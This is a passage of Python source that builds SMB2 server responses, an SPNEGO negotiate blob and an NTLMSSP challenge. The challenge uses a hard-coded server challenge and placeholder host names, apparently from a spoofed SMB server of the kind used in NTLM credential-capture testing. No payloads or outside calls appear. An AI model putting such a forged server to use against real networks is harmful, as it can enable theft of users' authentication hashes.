        ("ThisMechASNStr",            b"\x2b\x06\x01\x05\x05\x02"),
        ("SpNegoTokenASNId",          b"\xA0"),
        ("SpNegoTokenASNLen",         b"\x6c"),
        ("NegTokenASNId",             b"\x30"),
        ("NegTokenASNLen",            b"\x6a"),
        ("NegTokenTag0ASNId",         b"\xA0"),
        ("NegTokenTag0ASNLen",        b"\x3c"),
        ("NegThisMechASNId",          b"\x30"),
        ("NegThisMechASNLen",         b"\x3a"),
        ("NegThisMech1ASNId",         b"\x06"),
        ("NegThisMech1ASNLen",        b"\x0a"),
        ("NegThisMech1ASNStr",        b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e"),
        ("NegThisMech2ASNId",         b"\x06"),
        ("NegThisMech2ASNLen",        b"\x09"),
        ("NegThisMech2ASNStr",        b"\x2a\x86\x48\x82\xf7\x12\x01\x02\x02"),
        ("NegThisMech3ASNId",         b"\x06"),
        ("NegThisMech3ASNLen",        b"\x09"),
        ("NegThisMech3ASNStr",        b"\x2a\x86\x48\x86\xf7\x12\x01\x02\x02"),
        ("NegThisMech4ASNId",         b"\x06"),
        ("NegThisMech4ASNLen",        b"\x0a"),
        ("NegThisMech4ASNStr",        b"\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x03"),
        ("NegThisMech5ASNId",         b"\x06"),
        ("NegThisMech5ASNLen",        b"\x0a"),
        ("NegThisMech5ASNStr",        b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenTag3ASNId",         b"\xA3"),
        ("NegTokenTag3ASNLen",        b"\x2a"),
        ("NegHintASNId",              b"\x30"),
        ("NegHintASNLen",             b"\x28"),
        ("NegHintTag0ASNId",          b"\xa0"),
        ("NegHintTag0ASNLen",         b"\x26"),
        ("NegHintFinalASNId",         b"\x1b"), 
        ("NegHintFinalASNLen",        b"\x24"),
        ("NegHintFinalASNStr",        b"Server2008@SMB3.local"),
    ])

    def calculate(self):


        StructLen = bytes(self.fields["Len"])+bytes(self.fields["Signing"])+bytes(self.fields["Dialect"])+bytes(self.fields["Reserved"])+bytes(self.fields["Guid"])+bytes(self.fields["Capabilities"])+bytes(self.fields["MaxTransSize"])+bytes(self.fields["MaxReadSize"])+bytes(self.fields["MaxWriteSize"])+bytes(self.fields["SystemTime"])+bytes(self.fields["BootTime"])+bytes(self.fields["SecBlobOffSet"])+bytes(self.fields["SecBlobLen"])+bytes(self.fields["Reserved2"])
                 
        SecBlobLen = bytes(self.fields["InitContextTokenASNId"])+bytes(self.fields["InitContextTokenASNLen"])+bytes(self.fields["ThisMechASNId"])+bytes(self.fields["ThisMechASNLen"])+bytes(self.fields["ThisMechASNStr"])+bytes(self.fields["SpNegoTokenASNId"])+bytes(self.fields["SpNegoTokenASNLen"])+bytes(self.fields["NegTokenASNId"])+bytes(self.fields["NegTokenASNLen"])+bytes(self.fields["NegTokenTag0ASNId"])+bytes(self.fields["NegTokenTag0ASNLen"])+bytes(self.fields["NegThisMechASNId"])+bytes(self.fields["NegThisMechASNLen"])+bytes(self.fields["NegThisMech1ASNId"])+bytes(self.fields["NegThisMech1ASNLen"])+bytes(self.fields["NegThisMech1ASNStr"])+bytes(self.fields["NegThisMech2ASNId"])+bytes(self.fields["NegThisMech2ASNLen"])+bytes(self.fields["NegThisMech2ASNStr"])+bytes(self.fields["NegThisMech3ASNId"])+bytes(self.fields["NegThisMech3ASNLen"])+bytes(self.fields["NegThisMech3ASNStr"])+bytes(self.fields["NegThisMech4ASNId"])+bytes(self.fields["NegThisMech4ASNLen"])+bytes(self.fields["NegThisMech4ASNStr"])+bytes(self.fields["NegThisMech5ASNId"])+bytes(self.fields["NegThisMech5ASNLen"])+bytes(self.fields["NegThisMech5ASNStr"])+bytes(self.fields["NegTokenTag3ASNId"])+bytes(self.fields["NegTokenTag3ASNLen"])+bytes(self.fields["NegHintASNId"])+bytes(self.fields["NegHintASNLen"])+bytes(self.fields["NegHintTag0ASNId"])+bytes(self.fields["NegHintTag0ASNLen"])+bytes(self.fields["NegHintFinalASNId"])+bytes(self.fields["NegHintFinalASNLen"])+bytes(self.fields["NegHintFinalASNStr"])


        AsnLenStart = bytes(self.fields["ThisMechASNId"])+bytes(self.fields["ThisMechASNLen"])+bytes(self.fields["ThisMechASNStr"])+bytes(self.fields["SpNegoTokenASNId"])+bytes(self.fields["SpNegoTokenASNLen"])+bytes(self.fields["NegTokenASNId"])+bytes(self.fields["NegTokenASNLen"])+bytes(self.fields["NegTokenTag0ASNId"])+bytes(self.fields["NegTokenTag0ASNLen"])+bytes(self.fields["NegThisMechASNId"])+bytes(self.fields["NegThisMechASNLen"])+bytes(self.fields["NegThisMech1ASNId"])+bytes(self.fields["NegThisMech1ASNLen"])+bytes(self.fields["NegThisMech1ASNStr"])+bytes(self.fields["NegThisMech2ASNId"])+bytes(self.fields["NegThisMech2ASNLen"])+bytes(self.fields["NegThisMech2ASNStr"])+bytes(self.fields["NegThisMech3ASNId"])+bytes(self.fields["NegThisMech3ASNLen"])+bytes(self.fields["NegThisMech3ASNStr"])+bytes(self.fields["NegThisMech4ASNId"])+bytes(self.fields["NegThisMech4ASNLen"])+bytes(self.fields["NegThisMech4ASNStr"])+bytes(self.fields["NegThisMech5ASNId"])+bytes(self.fields["NegThisMech5ASNLen"])+bytes(self.fields["NegThisMech5ASNStr"])+bytes(self.fields["NegTokenTag3ASNId"])+bytes(self.fields["NegTokenTag3ASNLen"])+bytes(self.fields["NegHintASNId"])+bytes(self.fields["NegHintASNLen"])+bytes(self.fields["NegHintTag0ASNId"])+bytes(self.fields["NegHintTag0ASNLen"])+bytes(self.fields["NegHintFinalASNId"])+bytes(self.fields["NegHintFinalASNLen"])+bytes(self.fields["NegHintFinalASNStr"])

        AsnLen2 = bytes(self.fields["NegTokenASNId"])+bytes(self.fields["NegTokenASNLen"])+bytes(self.fields["NegTokenTag0ASNId"])+bytes(self.fields["NegTokenTag0ASNLen"])+bytes(self.fields["NegThisMechASNId"])+bytes(self.fields["NegThisMechASNLen"])+bytes(self.fields["NegThisMech1ASNId"])+bytes(self.fields["NegThisMech1ASNLen"])+bytes(self.fields["NegThisMech1ASNStr"])+bytes(self.fields["NegThisMech2ASNId"])+bytes(self.fields["NegThisMech2ASNLen"])+bytes(self.fields["NegThisMech2ASNStr"])+bytes(self.fields["NegThisMech3ASNId"])+bytes(self.fields["NegThisMech3ASNLen"])+bytes(self.fields["NegThisMech3ASNStr"])+bytes(self.fields["NegThisMech4ASNId"])+bytes(self.fields["NegThisMech4ASNLen"])+bytes(self.fields["NegThisMech4ASNStr"])+bytes(self.fields["NegThisMech5ASNId"])+bytes(self.fields["NegThisMech5ASNLen"])+bytes(self.fields["NegThisMech5ASNStr"])+bytes(self.fields["NegTokenTag3ASNId"])+bytes(self.fields["NegTokenTag3ASNLen"])+bytes(self.fields["NegHintASNId"])+bytes(self.fields["NegHintASNLen"])+bytes(self.fields["NegHintTag0ASNId"])+bytes(self.fields["NegHintTag0ASNLen"])+bytes(self.fields["NegHintFinalASNId"])+bytes(self.fields["NegHintFinalASNLen"])+bytes(self.fields["NegHintFinalASNStr"])

        MechTypeLen = bytes(self.fields["NegThisMechASNId"])+bytes(self.fields["NegThisMechASNLen"])+bytes(self.fields["NegThisMech1ASNId"])+bytes(self.fields["NegThisMech1ASNLen"])+bytes(self.fields["NegThisMech1ASNStr"])+bytes(self.fields["NegThisMech2ASNId"])+bytes(self.fields["NegThisMech2ASNLen"])+bytes(self.fields["NegThisMech2ASNStr"])+bytes(self.fields["NegThisMech3ASNId"])+bytes(self.fields["NegThisMech3ASNLen"])+bytes(self.fields["NegThisMech3ASNStr"])+bytes(self.fields["NegThisMech4ASNId"])+bytes(self.fields["NegThisMech4ASNLen"])+bytes(self.fields["NegThisMech4ASNStr"])+bytes(self.fields["NegThisMech5ASNId"])+bytes(self.fields["NegThisMech5ASNLen"])+bytes(self.fields["NegThisMech5ASNStr"])

        Tag3Len = bytes(self.fields["NegHintASNId"])+bytes(self.fields["NegHintASNLen"])+bytes(self.fields["NegHintTag0ASNId"])+bytes(self.fields["NegHintTag0ASNLen"])+bytes(self.fields["NegHintFinalASNId"])+bytes(self.fields["NegHintFinalASNLen"])+bytes(self.fields["NegHintFinalASNStr"])

                #Packet Struct len
        self.fields["Len"] = struct.pack("<h",len(StructLen)+1)
                #Sec Blob lens
        self.fields["SecBlobOffSet"] = struct.pack("<h",len(StructLen)+64)
        self.fields["SecBlobLen"] = struct.pack("<h",len(SecBlobLen))
                #ASN Stuff
        self.fields["InitContextTokenASNLen"] = struct.pack("<B", len(SecBlobLen)-2)
        self.fields["ThisMechASNLen"] = struct.pack("<B", len(bytes(self.fields["ThisMechASNStr"])))
        self.fields["SpNegoTokenASNLen"] = struct.pack("<B", len(AsnLen2))
        self.fields["NegTokenASNLen"] = struct.pack("<B", len(AsnLen2)-2)
        self.fields["NegTokenTag0ASNLen"] = struct.pack("<B", len(MechTypeLen))
        self.fields["NegThisMechASNLen"] = struct.pack("<B", len(MechTypeLen)-2)
        self.fields["NegThisMech1ASNLen"] = struct.pack("<B", len(bytes(self.fields["NegThisMech1ASNStr"])))
        self.fields["NegThisMech2ASNLen"] = struct.pack("<B", len(bytes(self.fields["NegThisMech2ASNStr"])))
        self.fields["NegThisMech3ASNLen"] = struct.pack("<B", len(bytes(self.fields["NegThisMech3ASNStr"])))
        self.fields["NegThisMech4ASNLen"] = struct.pack("<B", len(bytes(self.fields["NegThisMech4ASNStr"])))
        self.fields["NegThisMech5ASNLen"] = struct.pack("<B", len(bytes(self.fields["NegThisMech5ASNStr"])))
        self.fields["NegTokenTag3ASNLen"] = struct.pack("<B", len(Tag3Len))
        self.fields["NegHintASNLen"] = struct.pack("<B", len(Tag3Len)-2)
        self.fields["NegHintTag0ASNLen"] = struct.pack("<B", len(Tag3Len)-4)
        self.fields["NegHintFinalASNLen"] = struct.pack("<B", len(bytes(self.fields["NegHintFinalASNStr"])))

class SMB2Session1Data(Packet):
    fields = OrderedDict([
        ("Len",             b"\x09\x00"),
        ("SessionFlag",     b"\x00\x00"),
        ("SecBlobOffSet",   b"\x48\x00"),
        ("SecBlobLen",      b"\x06\x01"),
        ("ChoiceTagASNId",        b"\xa1"), 
        ("ChoiceTagASNLenOfLen",  b"\x82"), 
        ("ChoiceTagASNIdLen",     b"\x01\x02"),
        ("NegTokenTagASNId",      b"\x30"),
        ("NegTokenTagASNLenOfLen",b"\x81"),
        ("NegTokenTagASNIdLen",   b"\xff"),
        ("Tag0ASNId",             b"\xA0"),
        ("Tag0ASNIdLen",          b"\x03"),
        ("NegoStateASNId",        b"\x0A"),
        ("NegoStateASNLen",       b"\x01"),
        ("NegoStateASNValue",     b"\x01"),
        ("Tag1ASNId",             b"\xA1"),
        ("Tag1ASNIdLen",          b"\x0c"),
        ("Tag1ASNId2",            b"\x06"),
        ("Tag1ASNId2Len",         b"\x0A"),
        ("Tag1ASNId2Str",         b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("Tag2ASNId",             b"\xA2"),
        ("Tag2ASNIdLenOfLen",     b"\x81"),
        ("Tag2ASNIdLen",          b"\xE9"),
        ("Tag3ASNId",             b"\x04"),
        ("Tag3ASNIdLenOfLen",     b"\x81"),
        ("Tag3ASNIdLen",          b"\xE6"),
        ("NTLMSSPSignature",      b"NTLMSSP"),
        ("NTLMSSPSignatureNull",  b"\x00"),
        ("NTLMSSPMessageType",    b"\x02\x00\x00\x00"),
        ("NTLMSSPNtWorkstationLen",b"\x1e\x00"),
        ("NTLMSSPNtWorkstationMaxLen",b"\x1e\x00"),
        ("NTLMSSPNtWorkstationBuffOffset",b"\x38\x00\x00\x00"),
        ("NTLMSSPNtNegotiateFlags",b"\x15\x82\x89\xe2"),
        ("NTLMSSPNtServerChallenge",b"\x81\x22\x33\x34\x55\x46\xe7\x88"),
        ("NTLMSSPNtReserved",b"\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("NTLMSSPNtTargetInfoLen",b"\x94\x00"),
        ("NTLMSSPNtTargetInfoMaxLen",b"\x94\x00"),
        ("NTLMSSPNtTargetInfoBuffOffset",b"\x56\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionHigh",b"\x06"),
        ("NegTokenInitSeqMechMessageVersionLow",b"\x03"),
        ("NegTokenInitSeqMechMessageVersionBuilt",b"\x80\x25"),
        ("NegTokenInitSeqMechMessageVersionReserved",b"\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType",b"\x0f"),
        ("NTLMSSPNtWorkstationName","SMB3"),
        ("NTLMSSPNTLMChallengeAVPairsId",b"\x02\x00"),
        ("NTLMSSPNTLMChallengeAVPairsLen",b"\x0a\x00"),
        ("NTLMSSPNTLMChallengeAVPairsUnicodeStr","SMB3"),
        ("NTLMSSPNTLMChallengeAVPairs1Id",b"\x01\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1Len",b"\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1UnicodeStr","WIN-PRH492RQAFV"), 
        ("NTLMSSPNTLMChallengeAVPairs2Id",b"\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2Len",b"\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2UnicodeStr","SMB3.local"), 
        ("NTLMSSPNTLMChallengeAVPairs3Id",b"\x03\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3Len",b"\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3UnicodeStr","WIN-PRH492RQAFV.SMB3.local"),
        ("NTLMSSPNTLMChallengeAVPairs5Id",b"\x05\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5Len",b"\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5UnicodeStr","SMB3.local"),
        ("NTLMSSPNTLMChallengeAVPairs7Id",b"\x07\x00"),
        ("NTLMSSPNTLMChallengeAVPairs7Len",b"\x08\x00"),
        ("NTLMSSPNTLMChallengeAVPairs7UnicodeStr",b"\xc0\x65\x31\x50\xde\x09\xd2\x01"),
        ("NTLMSSPNTLMChallengeAVPairs6Id",b"\x00\x00"),
        ("NTLMSSPNTLMChallengeAVPairs6Len",b"\x00\x00"),
    ])


    def calculate(self):
                ###### Convert strings to Unicode
        self.fields["NTLMSSPNtWorkstationName"] = self.fields["NTLMSSPNtWorkstationName"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"].encode('utf-16le')
                
                #Packet struct calc:
        StructLen = bytes(self.fields["Len"])+bytes(self.fields["SessionFlag"])+bytes(self.fields["SecBlobOffSet"])+bytes(self.fields["SecBlobLen"])
        ###### SecBlobLen Calc:
        CalculateSecBlob = bytes(self.fields["NTLMSSPSignature"])+bytes(self.fields["NTLMSSPSignatureNull"])+bytes(self.fields["NTLMSSPMessageType"])+bytes(self.fields["NTLMSSPNtWorkstationLen"])+bytes(self.fields["NTLMSSPNtWorkstationMaxLen"])+bytes(self.fields["NTLMSSPNtWorkstationBuffOffset"])+bytes(self.fields["NTLMSSPNtNegotiateFlags"])+bytes(self.fields["NTLMSSPNtServerChallenge"])+bytes(self.fields["NTLMSSPNtReserved"])+bytes(self.fields["NTLMSSPNtTargetInfoLen"])+bytes(self.fields["NTLMSSPNtTargetInfoMaxLen"])+bytes(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionLow"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])+bytes(self.fields["NTLMSSPNtWorkstationName"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs7Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs7Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs7UnicodeStr"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])
        AsnLen = bytes(self.fields["ChoiceTagASNId"])+bytes(self.fields["ChoiceTagASNLenOfLen"])+bytes(self.fields["ChoiceTagASNIdLen"])+bytes(self.fields["NegTokenTagASNId"])+bytes(self.fields["NegTokenTagASNLenOfLen"])+bytes(self.fields["NegTokenTagASNIdLen"])+bytes(self.fields["Tag0ASNId"])+bytes(self.fields["Tag0ASNIdLen"])+bytes(self.fields["NegoStateASNId"])+bytes(self.fields["NegoStateASNLen"])+bytes(self.fields["NegoStateASNValue"])+bytes(self.fields["Tag1ASNId"])+bytes(self.fields["Tag1ASNIdLen"])+bytes(self.fields["Tag1ASNId2"])+bytes(self.fields["Tag1ASNId2Len"])+bytes(self.fields["Tag1ASNId2Str"])+bytes(self.fields["Tag2ASNId"])+bytes(self.fields["Tag2ASNIdLenOfLen"])+bytes(self.fields["Tag2ASNIdLen"])+bytes(self.fields["Tag3ASNId"])+bytes(self.fields["Tag3ASNIdLenOfLen"])+bytes(self.fields["Tag3ASNIdLen"])


                #Packet Struct len
        self.fields["Len"] = struct.pack("<h",len(StructLen)+1)
        self.fields["SecBlobLen"] = struct.pack("<H", len(AsnLen+CalculateSecBlob))
        self.fields["SecBlobOffSet"] = struct.pack("<h",len(StructLen)+64)

        ###### ASN Stuff
        if len(CalculateSecBlob) > 255:
            self.fields["Tag3ASNIdLen"] = struct.pack(">H", len(CalculateSecBlob))
        else:
            self.fields["Tag3ASNIdLenOfLen"] = b"\x81"
            self.fields["Tag3ASNIdLen"] = struct.pack(">B", len(CalculateSecBlob))

        if len(AsnLen+CalculateSecBlob)-3 > 255:
            self.fields["ChoiceTagASNIdLen"] = struct.pack(">H", len(AsnLen+CalculateSecBlob)-4)
        else:
            self.fields["ChoiceTagASNLenOfLen"] = b"\x81"
            self.fields["ChoiceTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-3)

        if len(AsnLen+CalculateSecBlob)-7 > 255:
           self.fields["NegTokenTagASNIdLen"] = struct.pack(">H", len(AsnLen+CalculateSecBlob)-8)
        else:
           self.fields["NegTokenTagASNLenOfLen"] = b"\x81"
           self.fields["NegTokenTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-7)
                
        tag2length = CalculateSecBlob+bytes(self.fields["Tag3ASNId"])+bytes(self.fields["Tag3ASNIdLenOfLen"])+bytes(self.fields["Tag3ASNIdLen"])

        if len(tag2length) > 255:
            self.fields["Tag2ASNIdLen"] = struct.pack(">H", len(tag2length))
        else:
           self.fields["Tag2ASNIdLenOfLen"] = b"\x81"
           self.fields["Tag2ASNIdLen"] = struct.pack(">B", len(tag2length))

        self.fields["Tag1ASNIdLen"] = struct.pack(">B", len(bytes(self.fields["Tag1ASNId2"])+bytes(self.fields["Tag1ASNId2Len"])+bytes(self.fields["Tag1ASNId2Str"])))
        self.fields["Tag1ASNId2Len"] = struct.pack(">B", len(bytes(self.fields["Tag1ASNId2Str"])))

        ###### Workstation Offset
        CalculateOffsetWorkstation = bytes(self.fields["NTLMSSPSignature"])+bytes(self.fields["NTLMSSPSignatureNull"])+bytes(self.fields["NTLMSSPMessageType"])+bytes(self.fields["NTLMSSPNtWorkstationLen"])+bytes(self.fields["NTLMSSPNtWorkstationMaxLen"])+bytes(self.fields["NTLMSSPNtWorkstationBuffOffset"])+bytes(self.fields["NTLMSSPNtNegotiateFlags"])+bytes(self.fields["NTLMSSPNtServerChallenge"])+bytes(self.fields["NTLMSSPNtReserved"])+bytes(self.fields["NTLMSSPNtTargetInfoLen"])+bytes(self.fields["NTLMSSPNtTargetInfoMaxLen"])+bytes(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionLow"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        ###### AvPairs Offset
        CalculateLenAvpairs = bytes(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs7Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs7Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs7UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])

        ##### Workstation Offset Calculation:
        self.fields["NTLMSSPNtWorkstationBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation))
        self.fields["NTLMSSPNtWorkstationLen"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtWorkstationMaxLen"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNtWorkstationName"])))

        ##### Target Offset Calculation:
        self.fields["NTLMSSPNtTargetInfoBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation+bytes(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtTargetInfoLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        self.fields["NTLMSSPNtTargetInfoMaxLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        
        ##### IvPair Calculation:
        self.fields["NTLMSSPNTLMChallengeAVPairs7Len"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairs7UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs5Len"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs3Len"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs2Len"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs1Len"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairsLen"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])))

class SMB2Session2Data(Packet):
    fields = OrderedDict([
        ("Len",             b"\x09\x00"),
        ("SessionFlag",     b"\x00\x00"),
        ("SecBlobOffSet",   b"\x00\x00\x00\x00"),
    ])
